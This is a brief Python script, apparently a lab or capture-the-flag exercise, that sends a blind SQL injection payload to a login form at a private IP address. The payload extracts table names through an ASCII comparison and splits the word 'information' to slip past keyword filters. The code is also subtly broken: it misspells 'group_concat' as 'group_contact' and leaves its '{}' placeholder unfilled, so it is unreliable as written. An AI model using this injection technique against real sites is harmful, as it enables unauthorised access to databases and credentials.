import requests

cookies = {
    'PHPSESSID': 'vkucotdfashb4cagnlp8r8gui4',
}

headers = {
    'Host': '10.147.245.200',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:47.0) Gecko/20100101 Firefox/47.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,en-GB;q=0.9,zh-TW;q=0.7,zh;q=0.6,zh-HK;q=0.4,en-US;q=0.3,en;q=0.1',
    'DNT': '1',
    'Connection': 'keep-alive',
}


data = {
  '$uname': "admin'=(ascii(mid((select(group_contact(table_name))from(inf+char(111)+rmation_schema.tables)where(table_schema=database()))from(1)))={})='1",
  'passwd': '123'
}

response = requests.post('http://10.147.245.200/b1/login.php', headers=headers, cookies=cookies, data=data)
